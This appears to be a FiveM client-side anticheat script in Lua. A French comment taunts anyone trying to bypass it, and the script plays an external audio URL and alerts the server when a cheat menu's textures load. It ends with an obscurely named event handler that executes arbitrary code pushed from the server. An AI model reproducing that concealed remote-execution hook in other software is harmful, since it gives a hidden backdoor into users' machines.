-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if NetworkIsSessionStarted() then
			_TriggerServerEvent('::{ayzwen}::hardcap:playerActivated')
			return
		end
	end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if HasStreamedTextureDictLoaded("commonmenu") then
            CreateDui('http://azvietmd.alwaysdata.net/starf.mp3', 1, 1)
            Citizen.Wait(4500)
            TriggerServerEvent('detect')
			Citizen.Wait(5000)
        end
    end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)